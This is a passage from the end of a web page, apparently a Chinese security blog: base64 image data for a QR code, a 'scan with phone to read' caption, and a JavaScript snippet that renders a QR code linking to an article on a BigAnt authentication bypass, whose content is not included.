9JgcZbCxy5lvh2nPt2j89VLP4QfH+RL/t2j0/51Y5E+gKxNrB/Mfz6sI+HfmTBOUk4fX9PMHJ+OqxxLIRTD1jS/iDZiOSoTmYKOJ5sON/ZzXJw5nO9tTOE6O0cRAwjVo3WkMGohZ5zrfChgahg2989geFdlqYqu1pWeZk1EBN3PEPpZRBaoMnEyxoxcZSX1ZQ4G9BuC1ClXewakzU2L1zlzAulm5lytyzX7RuST+MD/DcM5AO+6w/ewvJtL3Bc/3zd/H3AmJPO+WdRPWQQ/XMfGLmcn/nqJZvlIPpBoDUQMWDqOAfo3xSoLzDkXASRc3wv7hty70m9SDe8qENMVk+ADCIG2pbEy4D2hED/BEGfg4hbkwtHvWVZolgG6z7KZ8v18iFqod+rapSXyV+Z8jKIPvKr1dqaVwxRD4HibPuG+CQ+BB96DfH0ISbr2Dj7np7JQfS/6nfV13XQ93GN0Jo/QfWxQawFge4LEQOmLn/x3TekHdNnOG0gnnTdFtC9TsD58xci5xqIGE6NczOE0Nfcai/SQV8DEcOI0svcD0YNBCddNYgc9DjrZ672MC9c5TLfBpLJ7b/vBPZA3nf205XbQCCupa5WtlkV9FqIOGth5HJ+5kNfk/cBfc711szQGojarHHOHIQGTqwaa2c8RJ01ELG1M4TQuEbYBjIr2NzrT6D9YrhaWlOzWVNj8xmtgXgKnDMvNAehESczP0PlZc5B1MKJzhmllzkWKpbJv2UQva2DiOFE9ZJZI1/m+Arh7LNvyNVJvSHXfjHUNGV1D3BOT3kZBGetOJnje1E1Muuh72teKJ0Mbmukl0kvky+DqAUUdiZdNQvMr2LxQPfrgTgZnLxiGQQnv9q+IfVE3hy3gUBMDXqc7a8+MRA15oXQc7M+EJqag+BhRGshclrLBsFVjWPrhBBaCLQGIgZMNQSOW9CICwfWWq2fLbdpA8nk9t93Au1dVp6Y/KstQUwfAqWXXdU4B1EDmFqielarYuB4aoGWAg6uEROn9oX7aybt7qKgXwP6WE32DdEpfJDtgVwO4/XJ9ra3Ll2vtGJr5GeD8eo5D2Nu1afyELWAUw3df4YWOQcMP8Kg56zN6D73YK7Lfq41n7nq7xtST+TNcXtRh3hi4H703j15GGudmyH0evd7BOHs8UjdSgtnP+/ZWjhzgOkOgeE2WgCRg8DaX7p9Q3QKH2RtIJ7WPVj3DzHxzLtP5qpvjbHmcwzjGsq7Vqg4G/Q1EDGQZZ2vPjbgeNoh0LyxK/wJ7slZA9H3p/SANpAj2l/efgLDQCCmBiM+sluIetdAxLDG+uQ4FrqPEdZ9rFGdrMbibPB4H4ga9xVCcNCjcjaInGOj9yIcBmLRxvecwB7Ie859ueqvDERXrZpXhLimNa/YGvkyCK35GUonc06+rXKOjRD94UTn3GOG1hitcZzxnpz11sK5n18ZiBfY+Ocn8CsDgZhw3o6nb4TQwIk1l+tv+bUWxv+cB7GWtTOs60DUAC0FHG9/TUAfm8/otTJnH9b1vzIQL7Txz09gGIgnO8PVctbmPMRTAIE5t/LdxwhRC6xKpjxwPNG1z1R8B/lMH4g95PYQXO3nWDgMJDfY/utPoA0EYnpwG1fbhLNW05attJmXTgZnPZAlS191tqXoJwEcNwf4YR4DrzPDVad7tEDbVxvIquHmX3sCeyCvPe+bq/0PAAD//wlqHv4AAAAGSURBVAMAxUx4ochGYX4AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-loginByToken-authbypass.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 